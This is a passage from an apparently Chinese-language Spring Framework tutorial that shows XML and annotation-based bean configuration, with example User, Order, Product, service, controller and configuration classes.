class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Order</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String orderNumber<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">float</span> price<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Order</span><span class="token punctuation">(</span>String orderNumber<span class="token punctuation">,</span> <span class="token keyword">float</span> price<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>orderNumber <span class="token operator">=</span> orderNumber<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getOrderNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> orderNumber<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOrderNumber</span><span class="token punctuation">(</span>String orderNumber<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>orderNumber <span class="token operator">=</span> orderNumber<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">float</span> <span class="token function">getPrice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> price<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPrice</span><span class="token punctuation">(</span><span class="token keyword">float</span> price<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"Order{"</span> <span class="token operator">+</span>                <span class="token string">"orderNumber='"</span> <span class="token operator">+</span> orderNumber <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>                <span class="token string">", price="</span> <span class="token operator">+</span> price <span class="token operator">+</span>                <span class="token string">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>applicationContext.xml</strong></p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 用户 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.wh.spring.model.User<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>initMethod<span class="token punctuation">"</span></span> <span class="token attr-name">destroy-method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>destroyMethod<span class="token punctuation">"</span></span> <span class="token attr-name">scope</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prototype<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>小明<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 订单 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.wh.spring.model.Order<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100110001110<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>float<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>20.00<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>主入口，运行测试</p><p>ApplicationContextMain</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>ApplicationContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ClassPathXmlApplicationContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 主入口 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApplicationContextMain</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        User user <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span>ClassPathXmlApplicationContext<span class="token punctuation">)</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="四、基于注解的bean初始化及应用"><a href="#四、基于注解的bean初始化及应用" class="headerlink" title="四、基于注解的bean初始化及应用"></a>四、基于注解的bean初始化及应用</h2><h3 id="1-声明Bean注解"><a href="#1-声明Bean注解" class="headerlink" title="1.声明Bean注解:"></a>1.声明Bean注解:</h3><ul><li><p>@ Bean</p><p>指定为spring的bean</p></li><li><p>@Component</p><p>指定为组件，但无具体角色</p></li><li><p>@Controller</p><p>注册为控制器</p></li><li><p>@Service</p><p>注册为service，逻辑处理层对象</p></li><li><p>Repository</p><p>注册数据访问层对象</p></li></ul><h3 id="2-注入Bean注解"><a href="#2-注入Bean注解" class="headerlink" title="2.注入Bean注解"></a>2.注入Bean注解</h3><blockquote><p>JSR是Java Specification Requests的缩写，意思是Java规范提案</p></blockquote><ul><li><p>@Autowired</p><p>由Spring提供</p></li><li><p>@Inject</p><p>由JSR-330提供</p></li><li><p>@Resource</p><p>由JSR-250提供</p></li><li><p>@PostConstruct</p><p>由JSR-250提供，在构造函数执行完之后执行，等价于xml配置中的bean的initMethod</p></li><li><p>@PreDestory</p><p>由JSR-250提供，在Bean销毁之前执行，等价于xml配置文件的bean的destroyMethod</p></li></ul><p>3.配置类相关注解</p><ul><li><p>@Configuration</p><p>声明当前类为配置类，相当于xml形式的Spring配置（类上）</p></li><li><p>@Bean</p><p>注解在方法上，声明当前方法的返回值为一个bean，替代xm中的方式（方法上）</p></li><li><p>@Value</p><p>为属性注入值（支持普通字符、系统属性、表达式结果、其他bean属性等）</p></li><li><p>@ComponentScan</p><p>用于对Component进行扫描，相当于xml中的（类上）</p></li><li><p>@WishlyConfiguration</p><p>为@Configuration与@ComponentScan的组合注解，可以替代这两个注解</p></li></ul><h3 id="3-示例演示-1"><a href="#3-示例演示-1" class="headerlink" title="3.示例演示"></a>3.示例演示</h3><p>预览一下结构<br><img src="https://upload-images.jianshu.io/upload_images/21601015-d8ea500effcaefc5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><p><strong>User</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> Order order<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> Order <span class="token function">getOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> order<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOrder</span><span class="token punctuation">(</span>Order order<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>order <span class="token operator">=</span> order<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"User{"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token string">", order="</span> <span class="token operator">+</span> order <span class="token operator">+</span>                <span class="token string">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------User类初始化方法--------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroyMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------User类销毁方法--------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>Order</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Order</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String orderNumber<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">float</span> price<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Order</span><span class="token punctuation">(</span>String orderNumber<span class="token punctuation">,</span> <span class="token keyword">float</span> price<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>orderNumber <span class="token operator">=</span> orderNumber<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getOrderNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> orderNumber<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOrderNumber</span><span class="token punctuation">(</span>String orderNumber<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>orderNumber <span class="token operator">=</span> orderNumber<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">float</span> <span class="token function">getPrice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> price<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPrice</span><span class="token punctuation">(</span><span class="token keyword">float</span> price<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"Order{"</span> <span class="token operator">+</span>                <span class="token string">"orderNumber='"</span> <span class="token operator">+</span> orderNumber <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>                <span class="token string">", price="</span> <span class="token operator">+</span> price <span class="token operator">+</span>                <span class="token string">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>Product</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Value<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Product</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"一本小黄书"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String productName<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getProductName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> productName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setProductName</span><span class="token punctuation">(</span>String productName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>productName <span class="token operator">=</span> productName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"Product{"</span> <span class="token operator">+</span>                <span class="token string">"productName='"</span> <span class="token operator">+</span> productName <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>                <span class="token string">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>SpringApplicationConfig</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>config<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Bean<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">.</span>Product<span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringApplicationConfig</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span><span class="token string">"product"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> Product <span class="token function">getProduct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Product</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>UserService</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>service<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    User <span class="token function">getUserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>UserServiceImpl</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Autowired<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span>Service<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>service<span class="token punctuation">.</span>UserService<span class="token punctuation">;</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> User user<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> User <span class="token function">getUserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> user<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>UserController</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>controller<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Autowired<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span>Controller<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>UserServiceImpl<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>PostConstruct<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>PreDestroy<span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> UserServiceImpl userService<span class="token punctuation">;</span>    <span class="token keyword">public</span> User <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> userService<span class="token punctuation">.</span><span class="token function">getUserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@PostConstruct</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------UserController类初始化方法--------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@PreDestroy</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroyMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"----------UserController类销毁方法--------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>applicationContext.xml</strong></p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 用户 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.wh.spring.model.User<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>initMethod<span class="token punctuation">"</span></span> <span class="token attr-name">destroy-method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>destroyMethod<span class="token punctuation">"</span></span> <span class="token attr-name">scope</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>singleton<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>小明<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span 